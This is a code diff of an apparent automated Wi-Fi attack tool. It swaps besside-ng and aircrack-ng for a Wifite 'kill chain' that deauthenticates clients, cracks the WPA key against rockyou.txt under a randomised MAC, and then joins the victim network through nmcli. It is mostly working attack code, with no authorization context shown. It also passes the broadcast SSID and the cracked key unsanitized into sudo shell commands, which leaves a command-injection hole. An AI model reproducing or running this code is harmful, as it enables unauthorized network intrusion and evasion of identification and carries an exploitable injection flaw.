@@ -446,7 +446,7 @@ def auto_route(subnets: list[str]):
 
 def preflight_check():
     """Verify required system tools are installed before running any phase."""
-    tools = ["nmap", "aircrack-ng", "airodump-ng", "besside-ng", "airmon-ng", "macchanger"]
+    tools = ["nmap", "aircrack-ng", "airodump-ng", "wifite", "airmon-ng", "macchanger"]
     missing = []
     for tool in tools:
         rc, _ = run_cmd(f"which {tool}", capture=False)
@@ -595,77 +595,80 @@ def phase1_wifi_crack() -> PhaseResult:
                 f"[bold white]Target    :[/bold white] {chosen['ssid']}  ({bssid})\n"
                 f"[bold white]Channel   :[/bold white] {channel}\n"
                 f"[bold white]Duration  :[/bold white] 60 s\n"
-                f"[bold white]Method    :[/bold white] [green]besside-ng (fully automated)[/green]",
-                title="[bold cyan] Capturing via besside-ng [/bold cyan]",
+                f"[bold white]Method    :[/bold white] [green]Wifite2 (Auto-Deauth & Crack)[/green]",
+                title="[bold cyan] Executing Wifite Kill Chain [/bold cyan]",
                 border_style="cyan", expand=False,
             ))
 
-            run_cmd("sudo rm -f ./wpa.cap ./wepe.cap ./besside.log", capture=False)
-            run_cmd(
-                f"sudo timeout 60 besside-ng -b {bssid} {iface}",
-                timeout=75, capture=True,
+            run_cmd("sudo rm -f ./cracked.txt ./cracked.json", capture=False)
+            wl_arg = wl if wl else "/usr/share/wordlists/rockyou.txt"
+
+            wifite_cmd = (
+                f"sudo wifite --bssid {bssid} -i {iface} "
+                f"--wpa --dict {wl_arg} --wpatime 60 --random-mac"
             )
+            rc, out = run_cmd(wifite_cmd, timeout=300)
 
-            cap_file = "./wpa.cap"
-            if not os.path.exists(cap_file):
-                warn("No capture file created — interface may have lost monitor mode")
-            else:
-                ok("Capture file found — running aircrack-ng...")
-                wl_arg = wl if wl else "/dev/null"
-                rc, out = run_cmd(
-                    f"sudo aircrack-ng ./wpa.cap -w {wl_arg}", timeout=300
+            clean_out = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", out)
+            found_password = ""
+
+            # Primary: parse wifite's cracked.txt output file
+            if os.path.exists("./cracked.txt"):
+                with open("./cracked.txt", "r", errors="ignore") as f:
+                    cracked_data = f.read()
+                match = re.search(
+                    r'key:\s*["\']?(.*?)["\']?(?:\n|\r|$)',
+                    cracked_data, re.IGNORECASE,
                 )
-                if "KEY FOUND" in out:
-                    # Strip ANSI escape sequences before parsing — aircrack-ng
-                    # embeds cursor-movement codes that corrupt naive extraction.
-                    clean_out = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", out)
+                if match:
+                    found_password = match.group(1).strip()
 
-                    found_password = ""
-                    match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", clean_out)
-                    if match:
-                        found_password = match.group(1).strip()
+            # Fallback: scan wifite stdout for the key line
+            if not found_password:
+                match = re.search(
+                    r'key:\s*["\']?(.*?)["\']?(?:\n|\r|$)',
+                    clean_out, re.IGNORECASE,
+                )
+                if match:
+                    found_password = match.group(1).strip()
 
-                    r.status  = "success"
-                    r.finding = f"KEY FOUND! [ {found_password} ]" if found_password else "KEY FOUND"
-                    r.output  = out[-1000:]
-                    ok(r.finding)
+            if found_password:
+                r.status  = "success"
+                r.finding = f"KEY FOUND! [ {found_password} ]"
+                r.output  = out[-1000:]
+                ok(r.finding)
 
-                    # Restore managed mode before nmcli tries to associate
-                    _restore_managed()
+                # Restore managed mode before nmcli tries to associate
+                _restore_managed()
 
-                    if found_password:
-                        ssid = chosen["ssid"]
-                        ok(f"Connecting to [bold]{ssid}[/bold] via NetworkManager...")
-                        # Delete stale profile, create a fresh WPA-PSK one, then bring it up.
-                        # Explicit key-mgmt avoids the "property is missing" NM error that
-                        # occurs when NM can't auto-detect security after monitor mode.
-                        run_cmd(f"sudo nmcli con delete '{ssid}' 2>/dev/null || true",
-                                capture=False)
-                        run_cmd(
-                            f"sudo nmcli con add type wifi ifname {iface} "
-                            f"con-name '{ssid}' ssid '{ssid}' -- "
-                            f"wifi-sec.key-mgmt wpa-psk wifi-sec.psk '{found_password}'",
-                            capture=True,
-                        )
-                        run_cmd(f"sudo nmcli con up '{ssid}'", capture=True)
-                        info("Waiting 5 s for DHCP lease...")
-                        time.sleep(5)
-                        ok(f"{iface} should now have an IP on the target network")
-                    else:
-                        warn("Could not parse password from aircrack output — connect manually")
+                ssid = chosen["ssid"]
+                ok(f"Connecting to [bold]{ssid}[/bold] via NetworkManager...")
+                # Delete stale profile, create a fresh WPA-PSK one, then bring it up.
+                # Explicit key-mgmt avoids the "property is missing" NM error that
+                # occurs when NM can't auto-detect security after monitor mode.
+                run_cmd(f"sudo nmcli con delete '{ssid}' 2>/dev/null || true",
+                        capture=False)
+                run_cmd(
+                    f"sudo nmcli con add type wifi ifname {iface} "
+                    f"con-name '{ssid}' ssid '{ssid}' -- "
+                    f"wifi-sec.key-mgmt wpa-psk wifi-sec.psk '{found_password}'",
+                    capture=True,
+                )
+                run_cmd(f"sudo nmcli con up '{ssid}'", capture=True)
+                info("Waiting 5 s for DHCP lease...")
+                time.sleep(5)
+                ok(f"{iface} should now have an IP on the target network")
+                return r
 
-                    return r
-
-                warn("aircrack-ng did not find the key")
-
+            warn("Wifite did not find the key")
             console.print()
             if not Confirm.ask(
-                "[yellow]Retry besside-ng capture on this AP?[/yellow]", default=True
+                "[yellow]Retry Wifite attack on this AP?[/yellow]", default=True
             ):
                 break
 
         r.status  = "failed"
-        r.finding = "besside-ng capture not cracked — try a longer capture or bigger wordlist"
+        r.finding = "Wifite did not crack the key — try a longer attack or bigger wordlist"
         err(r.finding)
 
     finally:
